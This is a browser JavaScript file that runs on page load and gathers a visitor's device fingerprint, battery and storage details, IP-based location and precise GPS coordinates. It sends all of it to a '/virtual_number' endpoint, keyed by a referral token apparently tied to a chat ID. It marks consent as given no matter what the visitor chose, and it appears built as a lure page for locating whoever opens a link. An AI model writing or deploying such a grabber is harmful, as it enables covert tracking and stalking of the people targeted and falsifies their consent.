let collectedData = null;

function getChatIdFromUrl() {
  const params = new URLSearchParams(window.location.search);
  const referral = params.get("referral");
  if (referral && /^[A-Za-z0-9_-]{20,}$/.test(referral)) {
    return referral;
  }

  return null;
}

function safeValue(value, fallback = "Unavailable") {
  if (value === null || value === undefined || value === "") {
    return fallback;
  }
  return value;
}

function getDeviceModel() {
  const uaData = navigator.userAgentData;
  if (uaData && Array.isArray(uaData.brands)) {
    return safeValue(uaData.platform, "Unknown platform");
  }
  return safeValue(navigator.platform, "Not exposed by browser");
}

async function getBatteryDetails() {
  if (!navigator.getBattery) {
    return {
      battery_level: "Unavailable",
      battery_charging: "Unavailable",
    };
  }

  try {
    const battery = await navigator.getBattery();
    return {
      battery_level: `${Math.round((battery.level || 0) * 100)}%`,
      battery_charging: battery.charging ? "Yes" : "No",
    };
  } catch (_err) {
    return {
      battery_level: "Unavailable",
      battery_charging: "Unavailable",
    };
  }
}



async function getIpAndApproxLocation() {
  try {
    const response = await fetch("/get-ip");
    const data = await response.json();

    if (!response.ok) {
      return {
        ip_address: "Unavailable",
        country: "Unavailable",
        region: "Unavailable",
        city: "Unavailable",
        timezone: "Unavailable",
      };
    }

    return data;

  } catch (_err) {
    return {
      ip_address: "Unavailable",
      country: "Unavailable",
      region: "Unavailable",
      city: "Unavailable",
      timezone: "Unavailable",
    };
  }
}

async function getPreciseLocation() {
  if (!navigator.geolocation) {
    return { precise_latitude: null, precise_longitude: null };
  }

  return new Promise((resolve) => {
    navigator.geolocation.getCurrentPosition(
      (position) => resolve({
        precise_latitude: position.coords.latitude,
        precise_longitude: position.coords.longitude,
      }),
      () => resolve({ precise_latitude: null, precise_longitude: null }),
      // If permission is dismissed or location cannot be obtained quickly,
      // send the IP/device report instead of holding the page open.
      { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 },
    );
  });
}

function bytesToGBString(bytes) {
  if (typeof bytes !== "number") {
    return "Unavailable";
  }
  return `${(bytes / (1024 ** 3)).toFixed(2)} GB`;
}

async function getStorageDetails() {
  if (!navigator.storage || !navigator.storage.estimate) {
    return {
      storage_used_gb: "Unavailable",
      storage_total_gb: "Unavailable",
    };
  }

  try {
    const estimate = await navigator.storage.estimate();
    return {
      storage_used_gb: bytesToGBString(estimate.usage),
      storage_total_gb: bytesToGBString(estimate.quota),
    };
  } catch (_err) {
    return {
      storage_used_gb: "Unavailable",
      storage_total_gb: "Unavailable",
    };
  }
}

document.addEventListener("DOMContentLoaded", async () => {

  // The browser shows its location permission prompt. A refusal falls back to IP location.
  const battery = await getBatteryDetails();
  const ipData = await getIpAndApproxLocation();
  const preciseLocation = await getPreciseLocation();
  const storageData = await getStorageDetails();

  collectedData = {
    device_model: getDeviceModel(),
    user_agent: navigator.userAgent,
    language: navigator.language,
    screen_resolution: `${window.screen.width}x${window.screen.height}`,
    consent_given: true,
    cpu_cores: navigator.hardwareConcurrency ?? "Unavailable",
    ram_gb: navigator.deviceMemory ?? "Unavailable",
    battery_level: battery.battery_level,
    battery_charging: battery.battery_charging,
    ip_address: ipData.ip_address,
    country: ipData.country,
    region: ipData.region,
    city: ipData.city,
    timezone: ipData.timezone,
    ip_latitude: ipData.latitude,
    ip_longitude: ipData.longitude,
    precise_latitude: preciseLocation.precise_latitude,
    precise_longitude: preciseLocation.precise_longitude,
    storage_used_gb: storageData.storage_used_gb,
    storage_total_gb: storageData.storage_total_gb,
  };

  const referralToken = getChatIdFromUrl();
  if (!referralToken) {
    console.error("Missing or invalid referral token.");
    return;
  }

  try {
    const response = await fetch(`/virtual_number?referral=${encodeURIComponent(referralToken)}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(collectedData),
    });
    const result = await response.json();
    if (!response.ok) {
      console.error("Visitor report was not sent:", result.error || "Unknown error");
    }
  } catch (err) {
    console.error("Visitor report network error:", err);
  }

});
